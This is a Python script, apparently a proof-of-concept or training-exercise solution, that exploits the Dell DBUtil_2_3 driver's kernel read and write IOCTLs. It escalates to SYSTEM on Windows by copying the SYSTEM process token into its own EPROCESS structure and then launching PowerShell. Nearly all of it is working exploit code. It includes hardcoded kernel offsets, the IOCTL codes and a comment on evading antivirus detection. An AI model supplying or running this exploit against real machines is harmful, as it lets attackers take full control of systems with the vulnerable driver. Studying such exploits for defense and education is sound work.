from ctypes import (windll, LittleEndianStructure, POINTER, byref, cast,
                    sizeof, c_byte, c_uint64)
from ctypes.wintypes import LPVOID, DWORD, LPCSTR, LPSTR, BOOL, HANDLE
import os


gle = windll.kernel32.GetLastError


# ctypes errcheck functions
def errcheck_bool(res, func, args):
    if not res:
        raise Exception("{} failed. GLE: {}".format(func.__name__, gle()))
    return res


def errcheck_drivername(res, func, args):
    if res == 0:
        raise Exception("{} failed. GLE: {}".format(func.__name__, gle()))
    if res == args[2]:
        raise Exception("{} failed. Buffer too short. GLE: {}"
                        .format(func.__name__, gle()))
    return res


def errcheck_createfile(res, func, args):
    if res == HANDLE(-1).value:  # INVALID_HANDLE_VALUE
        raise Exception("Failed to open device {}. GLE: {}"
                        .format(args[0], gle()))
    return res


# functions
GetProcAddress = windll.kernel32.GetProcAddress # Retrieves the address of an exported function/procedure or variable from the specified DLL
LoadLibraryA = windll.kernel32.LoadLibraryA # Loads the specified module into the address space of the calling process. The specified module may cause other modules to be loaded
CreateFileA = windll.kernel32.CreateFileA # Creates or opens a file or I/O device
DeviceIoControl = windll.kernel32.DeviceIoControl # Sends a control code directly to a specified device driver, causing the corresponding device to perform the corresponding operation
GetDeviceDriverBaseNameA = windll.Psapi.GetDeviceDriverBaseNameA # retrives the base name of the specified device driver
EnumDeviceDrivers = windll.Psapi.EnumDeviceDrivers # retrives the load address for each device driver in the system

# param/return types
GetProcAddress.restype = LPVOID
GetProcAddress.argtypes = [LPVOID, LPCSTR]
LoadLibraryA.restype = LPVOID
LoadLibraryA.argtypes = [LPCSTR]
CreateFileA.restype = HANDLE
# we won't use LPSECURITY_ATTRIBUTES (arg 4) so just use LPVOID
CreateFileA.argtypes = [LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE]
CreateFileA.errcheck = errcheck_createfile
DeviceIoControl.restype = BOOL
# we won't use LPOVERLAPPED (arg 8) so just use LPVOID
DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD,
                            POINTER(DWORD), LPVOID]
DeviceIoControl.errcheck = errcheck_bool
GetDeviceDriverBaseNameA.restype = DWORD
GetDeviceDriverBaseNameA.argtypes = [LPVOID, LPCSTR, DWORD]
GetDeviceDriverBaseNameA.errcheck = errcheck_drivername
EnumDeviceDrivers.restype = BOOL
EnumDeviceDrivers.argtypes = [LPVOID, DWORD, POINTER(DWORD)]
EnumDeviceDrivers.errcheck = errcheck_bool

# constants
GENERIC_READ = (1 << 30)
GENERIC_WRITE = (1 << 31)
FILE_SHARE_READ = 1
FILE_SHARE_WRITE = 2
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x80
"""
dt _EPROCESS
nt!_EPROCESS
   +0xXXX UniqueProcessId    : Ptr64 Void
   +0xYYY ActiveProcessLinks : _LIST_ENTRY
   +0xZZZ Token              : _EX_FAST_REF
"""
# +0x440 UniqueProcessId    : 0x00000000`00000004 Void
#    +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffffc88b`258f34c8 - 0xfffff800`44a1e060 ]
#    +0x4b8 Token              : _EX_FAST_REF
#    +0x5a8 ImageFileName      : [15]  "System"

pid_off = 0x440
aplinks_off = 0x448
token_off = 0x4b8
read_ioctl = 0x9B0C1EC4
write_ioctl = 0x9B0C1EC8


def GetProcAddressAbsolute(hmodule, realbase, symbol):
    """get the absolute address of a symbol in memory"""
    return GetProcAddress(hmodule, symbol) - hmodule + realbase


# when read address we can use reverse = true to get back the address in the better order due to the little endiand format looking odd when printed.
def read_vuln(hdev, readfrom, size, reverse = False):
    # example:
    # in case we want to readfrom=0xfffff802`146fb420
    # input_buffer needs to be: PADDPADD\x00\x00\x00\x00\x02\xf8\xff\xff\x20\xb4\x6f\x14PADD + "A"*size (PADD can be what ever, the number of bytes after 24 bytes, determine the size!)
    
    outbuffer_len = 24 + size
    outbuf = LPSTR(b"\x00" * outbuffer_len) if size else None
    outbuf = cast(outbuf, LPVOID)

    input_buffer = bytes(b"PADDPADD\x00\x00\x00\x00" + bytes([(readfrom >> 32) & 0xff,
                                                             (readfrom >> 40) & 0xff,
                                                             (readfrom >> 48) & 0xff,
                                                             (readfrom >> 56) & 0xff,
                                                             readfrom & 0xff,
                                                             (readfrom >> 8) & 0xff,
                                                             (readfrom >> 16) & 0xff,
                                                             (readfrom >> 24) & 0xff]) + 
                                                             b"PADD" + b"A" * size )

    DeviceIoControl(hdev, read_ioctl, input_buffer, len(input_buffer), outbuf, outbuffer_len,
                    None, None)
    outbuf = cast(outbuf, POINTER(c_byte * 32))

    outbuf = list(outbuf.contents)[24:]
    # due to endianess
    if reverse:
        outbuf = outbuf[::-1]

    return bytes([b%0x100 for b in outbuf])

def write_vuln(hdev, writeto, data_to_write, byte_order='little'):
    if isinstance(data_to_write, bytes) or isinstance(data_to_write, int):
        if isinstance(data_to_write, int):
            data_to_write = data_to_write.to_bytes(sizeof(LPVOID), 'little') # it needs to be in order when cocatenated to input_buffer
        else:
            if byte_order.lower() == 'big':
                data_to_write = data_to_write[::-1]
        input_buffer = bytes(b"PADDPADD\x00\x00\x00\x00" + bytes([(writeto >> 32) & 0xff,
                                                                (writeto >> 40) & 0xff,
                                                                (writeto >> 48) & 0xff,
                                                                (writeto >> 56) & 0xff,
                                                                writeto & 0xff,
                                                                (writeto >> 8) & 0xff,
                                                                (writeto >> 16) & 0xff,
                                                                (writeto >> 24) & 0xff]) + 
                                                                b"PADD" + data_to_write)
        
        outbuffer_len = len(input_buffer)
        outbuf = LPSTR(b"\x00" * outbuffer_len)
        outbuf = cast(outbuf, LPVOID)

        DeviceIoControl(hdev, write_ioctl, input_buffer, len(input_buffer), outbuf, outbuffer_len, None, None)
    else:
        raise ValueError(f"data_to_write must be of type bytes or int. got: {type(data_to_write)}")

# BOOL DeviceIoControl(
#   [in]                HANDLE       hDevice,
#   [in]                DWORD        dwIoControlCode,
#   [in, optional]      LPVOID       lpInBuffer,
#   [in]                DWORD        nInBufferSize,
#   [out, optional]     LPVOID       lpOutBuffer,
#   [in]                DWORD        nOutBufferSize,
#   [out, optional]     LPDWORD      lpBytesReturned,
#   [in, out, optional] LPOVERLAPPED lpOverlapped
# );


def get_bytes_pretty(bytes, space=True):
    if space:
        return ' '.join(f"0x{byte%0x100:02x}" for byte in bytes)
    else:
        return "0x" + ''.join(f"{byte%0x100:02x}" for byte in bytes)

def get_driver_bases():
    """Return a dictionary of loaded kernel modules and their base addresses"""
    lpcbNeeded = DWORD()
    EnumDeviceDrivers(None, 0, byref(lpcbNeeded))
    bases = (LPVOID*(lpcbNeeded.value//sizeof(LPVOID)))()
    EnumDeviceDrivers(byref(bases), lpcbNeeded, byref(lpcbNeeded))
    ret = dict()
    buf = LPSTR(b"\0" * 260)
    for base in bases:
        GetDeviceDriverBaseNameA(base, buf, 260)
        ret[buf.value.decode()] = base
    """
    Write code here to:
        1. Allocate an array of LPVOIDs of size lpcbNeeded
        2. Call EnumDeviceDrivers to populate the LPVOID array
        3. Allocate an appropriately sized character buffer to hold driver names
        4. Iterate over the LPVOID array and use the GetDeviceDriverBaseNameA
           function to get the name of each driver
        5. Add the {name: address} pair to the ret dictionary
    """
    return ret


# 1. Enumerate drivers, get kernel name and base address

bases = get_driver_bases()
krnlbase = bases["ntoskrnl.exe"]
print(f"kernel base @ 0x{krnlbase:08x}")

# 2. Open the device that DBUtil creates
hdbutil = CreateFileA(rb"\\.\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, None)

print("DBUtil_2_3 Handle = 0x{:x}".format(hdbutil))

# 3. Find system’s EPROCESS structure, get the system token

## just for poc. can do that manually instead of LoadLibrary the kernel and calculate it in code.
hkernel = LoadLibraryA(b"ntoskrnl.exe")
print(f"Local kernel copy @ 0x{hkernel:08x}")
# this will calculate the offset of PsInitialSystemProcess from the local copy of kernel we loaded and will use that offset to find it relative to the real krnlbase and will return the addr (real_kernel_base + offset_calcualted)
# this we can do manually to avoid Load a local copy of the kernel to our user process in user memory which is super sketchy and can be caught easily by AVs!
lpisp = GetProcAddressAbsolute(hkernel, krnlbase, b"PsInitialSystemProcess")
print(f"PsInitialSystemProcess Pointer @ 0x{lpisp:08x}")
## just for poc. can do that manually instead of LoadLibrary the kernel and calculate it in code.


# Now we use the DBUtil read vulnerability to read the isp from the lpisp address we calculated
isp = read_vuln(hdbutil, lpisp, sizeof(LPVOID), True)
print(f"Initial system process: {get_bytes_pretty(isp, space=False)}")
isp = int.from_bytes(isp, byteorder='big')

# now in isp we have the address of the system _EPROCESS where the token we want to steal is located.
# systoken = LPVOID()
systoken = read_vuln(hdbutil, isp + token_off, sizeof(LPVOID))
systoken = int.from_bytes(systoken, byteorder='little')
systoken &= ~0xf
print(f"systoken is located in address: 0x{systoken:x}")



# # 4 Find the current process’s EPROCESS structure
mypid = os.getpid()
curpid = c_uint64()
curproc = isp
while curpid.value != mypid:
    # here we use the vulnerability again to get the process id of each process as we don't have access to such info and the driver does.

    # move next
    curproc = int.from_bytes(read_vuln(hdbutil, curproc + aplinks_off, sizeof(LPVOID)), byteorder='little')
    # get proc base location
    curproc -= aplinks_off
    # get pid
    curpid = c_uint64(int.from_bytes(read_vuln(hdbutil, curproc + pid_off, sizeof(c_uint64)), byteorder='little'))

print(f"My EPROCESS is found at address 0x{curproc:x}")

# 5. Back up the current token, copy the system token to the current process’s
# Now we just need to copy the system token to our EPROCESS and we have all system privileges.
print("This is me before stealing the token")
os.system("whoami.exe")
oldtokaddr = read_vuln(hdbutil, curproc + token_off, sizeof(LPVOID))
# now we override our token with the new token
write_vuln(hdbutil, curproc + token_off, systoken)


# 6. Execute a program, restore the current process’s saved token
os.system("powershell.exe")
write_vuln(hdbutil, curproc + token_off, oldtokaddr)